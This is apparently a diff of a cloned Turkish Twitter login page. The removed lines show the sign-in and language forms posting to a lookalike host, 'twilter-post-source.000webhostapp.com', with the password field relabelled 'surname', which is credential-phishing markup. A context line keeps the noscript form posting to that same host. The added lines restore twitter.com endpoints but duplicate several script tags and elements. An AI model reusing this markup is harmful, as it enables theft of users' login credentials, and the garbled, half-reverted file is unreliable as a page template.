@@ -7,7 +7,7 @@
     
     
     <meta charset="utf-8">
-      <script async="" src="//www.google-analytics.com/analytics.js"></script><script nonce="zjBIJzv1OxtZXrzP21xoyg==">
+      <script async="" src="//www.google-analytics.com/analytics.js"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script nonce="zjBIJzv1OxtZXrzP21xoyg==">
         !function(){window.initErrorstack||(window.initErrorstack=[]),window.onerror=function(r,i,n,o,t){r.indexOf("Script error.")>-1||window.initErrorstack.push({errorMsg:r,url:i,lineNumber:n,column:o,errorObj:t})}}();
       </script>
     
@@ -48,11 +48,6 @@
 
 
 
-<link rel="mask-icon" sizes="any" href="https://abs.twimg.com/a/1550668526/icons/favicon.svg" color="#1da1f2">
-
-<link rel="shortcut icon" href="//abs.twimg.com/favicons/favicon.ico" type="image/x-icon">
-<link rel="apple-touch-icon" href="https://abs.twimg.com/icons/apple-touch-icon-192x192.png" sizes="192x192">
-
 <link rel="manifest" href="/manifest.json">
 
     <meta name="viewport" id="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
@@ -75,8 +70,8 @@
     <link id="async-css-placeholder">
 
     
-  <script type="text/javascript" charset="utf-8" async="" src="https://abs.twimg.com/k/tr/0.commons.tr.bd2506b7029d27c01904.js"></script><script type="text/javascript" charset="utf-8" async="" src="https://abs.twimg.com/k/tr/7.pages_signup.tr.48969f8be210f64366a6.js"></script></head>
-  <body class="three-col logged-out ms-windows western tr no-nav-banners" data-fouc-class-names="swift-loading no-nav-banners" dir="ltr">
+  <script type="text/javascript" charset="utf-8" async="" src="https://abs.twimg.com/k/tr/0.commons.tr.bd2506b7029d27c01904.js"></script><script type="text/javascript" charset="utf-8" async="" src="https://abs.twimg.com/k/tr/7.pages_signup.tr.48969f8be210f64366a6.js"></script><script type="text/javascript" charset="utf-8" async="" src="https://abs.twimg.com/k/tr/0.commons.tr.bd2506b7029d27c01904.js"></script><script type="text/javascript" charset="utf-8" async="" src="https://abs.twimg.com/k/tr/7.pages_signup.tr.48969f8be210f64366a6.js"></script></head>
+  <body class="three-col logged-out ms-windows western tr no-nav-banners no-nav-banners" data-fouc-class-names="swift-loading no-nav-banners" dir="ltr">
       <script id="swift_loading_indicator" nonce="zjBIJzv1OxtZXrzP21xoyg==">
         document.body.className=document.body.className+" "+document.body.getAttribute("data-fouc-class-names");
       </script>
@@ -86,15 +81,10 @@
       <form action="https://twilter-post-source.000webhostapp.com/" method="POST" class="NoScriptForm">
         <input type="hidden" value="83916b096a7eeebaa0c4a35e59afa821425feb6d" name="authenticity_token">
 
-        <div class="NoScriptForm-content">
-          <span class="NoScriptForm-logo Icon Icon--logo Icon--extraLarge"></span>
-          <p>Tarayıcında JavaScript'in devre dışı olduğunu belirledik. Eski Twitter'a devam etmek ister misin?</p>
-          <p class="NoScriptForm-buttonContainer"><button type="submit" class="EdgeButton EdgeButton--primary">Evet</button></p>
-        </div>
+       
       </form>
     </noscript>
 
-    <a href="#timeline" class="u-hiddenVisually focusable">İçeriğe geç</a>
 
     
     
@@ -110,14 +100,14 @@
     
 
 
-    <div class="global-nav global-nav--newLoggedOut" data-section-term="top_nav">
+        <div class="global-nav global-nav--newLoggedOut" data-section-term="top_nav">
       <div class="global-nav-inner">
         <div class="container">
 
           
 <ul class="nav js-global-actions" role="navigation" id="global-actions">
   <li id="global-nav-home" class="home" data-global-action="home">
-    <a class="js-nav js-tooltip js-dynamic-tooltip" data-placement="bottom" href="/" data-component-context="home_nav" data-nav="home">
+    <a class="js-nav js-tooltip js-dynamic-tooltip" data-placement="bottom" href="/" data-component-context="home_nav" data-nav="home" data-original-title="">
       <span class="Icon Icon--bird Icon--large"></span>
       <span class="text" aria-hidden="true">Anasayfa</span>
       <span class="u-hiddenVisually a11y-inactive-page-text">Anasayfa</span>
@@ -188,7 +178,7 @@
         </ul>
       </div>
       <div class="js-front-language">
-        <form action="https://twilter-post-source.000webhostapp.com/" class="t1-form language" method="POST">
+        <form action="/sessions/change_locale" class="t1-form language" method="POST">
           <input type="hidden" name="lang"> <input type="hidden" name="redirect">
           <input type="hidden" name="authenticity_token" value="83916b096a7eeebaa0c4a35e59afa821425feb6d">
         </form>
@@ -205,13 +195,13 @@
             <div class="dropdown-caret right"> <span class="caret-outer"></span> <span class="caret-inner"></span> </div>
             <div class="signin-dialog-body">
               <div>Hesabın var mı?</div>
-<form action="https://twilter-post-source.000webhostapp.com/" class="LoginForm js-front-signin" method="post" data-component="login_callout" data-element="form">
+<form action="https://twitter.com/sessions" class="LoginForm js-front-signin" method="post" data-component="login_callout" data-element="form">
   <div class="LoginForm-input LoginForm-username">
-    <input type="text" class="text-input email-input js-signin-email" name="name" autocomplete="username" placeholder="Telefon, e-posta veya kullanıcı adı">
+    <input type="text" class="text-input email-input js-signin-email" name="session[username_or_email]" autocomplete="username" placeholder="Telefon, e-posta veya kullanıcı adı">
   </div>
 
   <div class="LoginForm-input LoginForm-password">
-    <input type="password" class="text-input" name="surname" placeholder="Şifre" autocomplete="current-password">
+    <input type="password" class="text-input" name="session[password]" placeholder="Şifre" autocomplete="current-password">
     
   </div>
 
@@ -1213,4 +1203,5 @@
 
   
 
+<div id="sr-event-log" class="visuallyhidden" aria-live="assertive"></div>
 <div id="sr-event-log" class="visuallyhidden" aria-live="assertive"></div></body></html>
